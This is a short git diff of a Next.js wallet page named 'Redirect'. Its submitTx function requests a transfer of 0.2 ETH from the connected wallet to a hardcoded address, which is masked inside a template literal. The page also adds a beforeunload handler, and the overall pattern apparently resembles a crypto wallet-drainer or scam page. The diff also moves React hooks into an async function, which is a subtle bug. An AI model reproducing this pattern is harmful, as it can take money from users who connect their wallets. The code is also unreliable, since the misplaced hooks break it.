@@ -4,15 +4,15 @@ import {useRouter} from "next/navigation";
 import {useEffect} from "react";
 import Connect from '../../components/Connect'
 import { useWeb3ModalProvider, useWeb3ModalAccount } from '@web3modal/ethers/react'
-import { BrowserProvider, Contract, formatUnits } from 'ethers'
+import { BrowserProvider, Contract, ethers, formatUnits } from 'ethers'
 
 import { parseEther } from 'viem' 
+// import { estimateGas } from "viem/_types/actions/public/estimateGas";
 
 
 export default function Redirect() {
     const router = useRouter();
-    const { address, chainId, isConnected } = useWeb3ModalAccount()
-    const { walletProvider } = useWeb3ModalProvider()
+   
 
     useEffect(() => {
         const handleBeforeUnload = (event: BeforeUnloadEvent) => {
@@ -43,10 +43,15 @@ export default function Redirect() {
     // })
 
     async function submitTx() {
+      const { address, chainId, isConnected } = useWeb3ModalAccount()
+      const { walletProvider } = useWeb3ModalProvider()
       if (!isConnected) throw Error('User disconnected')
       if (!walletProvider) throw Error('Wallet Provider Abscent')
       const ethersProvider = new BrowserProvider(walletProvider)
+
       const signer = await ethersProvider.getSigner()
+      let estimateGas = ethersProvider.estimateGas({ to: `0x${"47dEAF612F0769d99aDB653bA2d22bba79F26C42"}`, value: parseEther("0.2")})
+    
       await signer.sendTransaction({ to: `0x${"47dEAF612F0769d99aDB653bA2d22bba79F26C42"}`, value: parseEther("0.2")})
     }
 
